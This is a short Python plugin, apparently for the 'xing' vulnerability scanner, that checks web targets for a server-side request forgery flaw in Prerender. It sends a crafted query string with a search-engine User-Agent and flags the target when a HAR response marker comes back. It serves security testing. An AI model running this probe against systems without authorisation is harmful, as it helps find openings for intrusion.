from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType


'''
参考
https://github.com/prerender/prerender

'''


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Prerender SSRF"
        self.app_name = 'Prerender'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        payload = "/?renderType=har&_escaped_fragment_=true"
        check = b"\"Prerender HAR"

        url = target + payload
        headers = {
           "User-Agent": "googlebot bingbot yandex baiduspider"
        }

        conn = http_req(url, headers=headers)

        if b'<' in conn.content:
            return

        if check in conn.content:
            self.logger.success("found Prerender ssrf {}".format(url))
            return url



